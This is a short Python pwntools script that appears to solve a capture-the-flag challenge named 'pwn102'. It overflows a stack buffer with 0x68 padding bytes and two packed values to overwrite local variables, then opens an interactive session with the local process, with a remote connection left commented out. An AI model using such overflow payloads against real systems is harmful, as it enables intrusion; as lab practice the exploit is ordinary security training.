from pwn import *

context.binary = binary = "./pwn102"

payload = b"A"*0x68
payload += p32(0xc0d3)
payload += p32(0xc0ff33)


print(payload)
#p = remote("IP", 9002)
p = process()
p.recv()
p.sendline(payload)
p.interactive()


